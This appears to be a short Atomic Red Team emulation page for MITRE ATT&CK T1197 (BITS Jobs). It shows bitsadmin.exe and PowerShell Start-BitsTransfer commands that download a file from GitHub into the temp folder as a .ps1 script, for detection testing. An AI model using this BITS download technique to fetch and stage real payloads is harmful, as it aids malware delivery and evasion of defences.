# BITS Jobs

## MITRE ATT&CK Technique:
[T1197](https://attack.mitre.org/wiki/Technique/T1197)

## bitsadmin.exe

    bitsadmin.exe  /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Execution/Bitsadmin.md $env:TEMP\AtomicRedTeam\bitsadmin_flag.ps1

## PowerShell

    Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Execution/Bitsadmin.md -Destination $env:TEMP\AtomicRedTeam\bitsadmin_flag.ps1
